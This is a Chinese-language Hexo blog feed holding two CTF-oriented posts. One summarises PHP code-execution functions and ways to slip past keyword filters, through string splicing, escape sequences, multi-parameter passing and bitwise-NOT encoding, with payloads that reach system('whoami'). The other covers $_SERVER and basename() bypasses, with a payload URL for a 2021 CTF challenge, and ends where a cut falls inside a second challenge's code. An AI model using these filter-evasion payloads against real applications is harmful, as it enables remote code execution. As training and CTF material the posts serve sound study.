<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p0l1st&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-12-21T12:24:39.474Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>p0l1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php代码执行绕过方法总结</title>
    <link href="http://example.com/2023/12/21/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/12/21/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2023-12-21T12:20:53.000Z</published>
    <updated>2023-12-21T12:24:39.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string $code):mixed</span><br></pre></td></tr></table></figure><p>将code当作php代码执行</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>php5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(mixed $assertion [,string $description]):bool</span><br></pre></td></tr></table></figure><p>php7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(mixed $assertion [,Throwable $exception]):bool</span><br></pre></td></tr></table></figure><p>assert()会检查指定的assertion，如果assertion是字符串，将会被当作代码执行</p><h3 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace()+&#x2F;e"></a>preg_replace()+&#x2F;e</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</span><br></pre></td></tr></table></figure><p>执行正则表达式的搜索和替换</p><p>搜索<strong>subject</strong>中匹配<strong>pattern</strong>的部分，并用replacement替换。</p><p>如果<strong>pattern</strong>模式修饰符使用**&#x2F;e<strong>，那么匹配成功后</strong>replacement**会被当作代码执行</p><p><img src="/../images/image-20231220221711422.png" alt="image-20231220221711422"></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(string $args, string $code):string</span><br></pre></td></tr></table></figure><p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。</p><p>可对参数或函数体闭合注入恶意代码导致代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&#x27;echo&#x27;</span>.<span class="variable">$id</span>.<span class="variable">$a</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&quot;;&#125;phpinfo();//</span><br></pre></td></tr></table></figure><h2 id="可回调函数"><a href="#可回调函数" class="headerlink" title="可回调函数"></a>可回调函数</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback , array $array , array ...$arrays ) : array</span><br></pre></td></tr></table></figure><p><strong>array_map()<strong>返回一个</strong>array</strong>，数组内容为<strong>array1</strong>的元素按索引顺序为参数调用<strong>callback</strong>后的结果(有更多数组时还会传入arrays)，<strong>callback</strong>函数形参的数量必须匹配**array_map()**实参中数组的数量。</p><p><img src="/../images/image-20231220223642972.png" alt="image-20231220223642972"></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure><p>第一个参数<strong>callback</strong>是被调用的回调函数，其余参数是回调函数的参数</p><p><img src="/../images/image-20231220225437826.png" alt="image-20231220225437826"></p><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array ( callable $callback , array $param_arr ) : mixed</span><br></pre></td></tr></table></figure><p>把第一个参数当作回调函数<strong>callback</strong>调用，把参数数组<strong>param_arr</strong>当作回调函数的参数传入</p><p><img src="/../images/image-20231220225711603.png" alt="image-20231220225711603"></p><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</span><br></pre></td></tr></table></figure><p>依次将<strong>array</strong>数组中的每个值传递到<strong>callback</strong>函数，如果<strong>callback</strong>函数返回true，则<strong>array</strong>数组当前值会被包含在返回结果数组中，数组的键名保持不变。</p><p><img src="/../images/image-20231220230053947.png" alt="image-20231220230053947"></p><h3 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort ( array &amp;$array , callable $value_compare_func ) : bool</span><br></pre></td></tr></table></figure><p>将用户自定义的比较函数对数组中的值进行排序。</p><p>如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><p>php&lt;5.6</p><p><img src="/../images/image-20231221154951752.png" alt="image-20231221154951752"></p><p><strong>php&gt;&#x3D;5.6&amp;php&lt;7  参数变长特性</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort(...$_GET);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221090947163.png" alt="image-20231221090947163"></p><h2 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h2><p><strong>php&gt;&#x3D;7</strong></p><p><strong>适用于绕过过滤具体关键字</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo|system/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no hack!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221160046354.png" alt="image-20231221160046354"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure><h2 id="字符串转义绕过"><a href="#字符串转义绕过" class="headerlink" title="字符串转义绕过"></a>字符串转义绕过</h2><p><strong>PHP&gt;&#x3D;7</strong></p><p>以八进制表示的[0-7]{1,3}\转义字符会自动匹配byte(如”\400”&#x3D;&#x3D;”\000”)</p><p>以十六进制表示的\x[0-9A-Fa-f]{1,2}\转义字符表示法(如”\41”)</p><p>以Unicode表示的\u{[0-9A-Fa-f]+}字符，会输出UTF-8字符串</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;();#phpinfo();</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&#x27;whoami&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;(&#x27;id&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&quot;\167\150\157\141\155\151&quot;);#system(&#x27;whoami&#x27;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221192218854.png" alt="image-20231221192218854"></p><h2 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h2><p><strong>过滤引号，可以使用以下方法</strong></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?1=system&amp;2=whoami</span><br><span class="line">POST：</span><br><span class="line">cmd=$_GET[1]($_GET[2]);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221192738080.png" alt="image-20231221192738080"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：</span><br><span class="line">cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221193023823.png" alt="image-20231221193023823"></p><p>如果php&gt;7</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">1=system(&#x27;whoami&#x27;);</span><br><span class="line">POST:</span><br><span class="line">cmd=eval($_GET[1]);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221193244064.png" alt="image-20231221193244064"></p><p>如果回调函数限制长度，在5.6&lt;php&lt;7中：</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?1[]=1&amp;1[]=phpinfo()&amp;2=assert</span><br><span class="line">POST:</span><br><span class="line">cmd=usort(...$_GET);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221194557136.png" alt="image-20231221194557136"></p><h2 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h2><p><strong>php&gt;&#x3D;7</strong></p><p><strong>get_defined_functions()</strong>:返回所有已定义函数的数组</p><p>注意不同php版本get_defined_functions()返回值不同</p><p>这里以<strong>php7.4.3</strong>为例</p><p>266-&gt;phpinfo</p><p>358-&gt;system</p><p><img src="/../images/image-20231221195549029.png" alt="image-20231221195549029"></p><p><img src="/../images/image-20231221195729256.png" alt="image-20231221195729256"></p><h2 id="URL编码绕过"><a href="#URL编码绕过" class="headerlink" title="URL编码绕过"></a>URL编码绕过</h2><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤所有字母和数字，利用取反构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(urlencode(~&#x27;phpinfo&#x27;));</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br><span class="line">phpinfo()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201442771.png" alt="image-20231221201442771"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);</span><br><span class="line">system(whoami)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201612330.png" alt="image-20231221201612330"></p><p>当<strong>5&lt;&#x3D;php&lt;&#x3D;7.0.9</strong>时，需要再执行一次构造出来的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">$_=(~&#x27;%9E%8C%8C%9A%8D%8B&#x27;);$__=&#x27;_&#x27;.(~&#x27;%AF%B0%AC%AB&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line">POST:</span><br><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201753001.png" alt="image-20231221201753001"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;代码执行函数&quot;&gt;&lt;a href=&quot;#代码执行函数&quot; class=&quot;headerlink&quot; title=&quot;代码执行函数&quot;&gt;&lt;/a&gt;代码执行函数&lt;/h2&gt;&lt;h3 id=&quot;eval&quot;&gt;&lt;a href=&quot;#eval&quot; class=&quot;headerlink&quot; title=&quot;e</summary>
      
    
    
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>$_SERVER参数和basename函数绕过</title>
    <link href="http://example.com/2023/12/19/post/"/>
    <id>http://example.com/2023/12/19/post/</id>
    <published>2023-12-19T11:15:31.000Z</published>
    <updated>2023-12-19T11:16:33.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SERVER参数和basename函数绕过"><a href="#SERVER参数和basename函数绕过" class="headerlink" title="$_SERVER参数和basename函数绕过"></a>$_SERVER参数和basename函数绕过</h1><h2 id="SERVER参数"><a href="#SERVER参数" class="headerlink" title="$_SERVER参数"></a>$_SERVER参数</h2><p>$_SERVER是PHP预定义变量之一，可以直接使用，它是一个包含了注入头信息(header)、路径(path)及脚本位置(script location)信息的数组。</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://aaa.com/php/index.php/test/foo?username=root</span><br></pre></td></tr></table></figure><p><strong>$_SERVER[‘PHP_SELF’]当前执行脚本的文件名:</strong></p><p>php&#x2F;index.php&#x2F;test&#x2F;foo</p><p><strong>$_SERVER[‘REQUEST_URI’]URI用来指定要访问的页面:</strong> </p><p>php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root</p><p>并且$_SERVER[‘REQUEST_URI’]$_SERVER[‘REQUEST_URI’]不会将参数中的特殊符号进行转换，也就是说它并不会进行URL解码</p><h2 id="basename函数"><a href="#basename函数" class="headerlink" title="basename函数"></a>basename函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(path,suffix)</span><br></pre></td></tr></table></figure><p>返回路径中的文件名部分</p><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path</span> = <span class="string">&quot;user01/home/documents/geeksforgeeks.php&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>); </span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geeksforgeeks.php</span><br></pre></td></tr></table></figure><h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先看第一个正则判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$_SERVER[‘PHP_SELF’]的值会赋给basename()函数</p><p>但是在默认环境中basename()会删除文件名开头非ASCII字符和中文</p><p>可以利用这一点来绕过这层正则判断</p><p>继续看第二个正则判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>URL编码绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28090/index.php/utils.php/卧槽?%73how_source</span><br></pre></td></tr></table></figure><p>当我们传入index.php&#x2F;utils.php&#x2F;时basename()函数会将其解析成utils.php，而这里的卧槽是绕过第一个正则，basename()会将其删除，而%73是为了绕过第二个正则。</p><p><img src="/../images/image-20231219190928665.png" alt="image-20231219190928665"></p><h1 id="琢光杯-2023-天命之子"><a href="#琢光杯-2023-天命之子" class="headerlink" title="[琢光杯 2023] 天命之子"></a>[琢光杯 2023] 天命之子</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sou_rc.e&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ars</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$sec</span>=<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">100000</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$sec</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ars</span>);</span><br><span 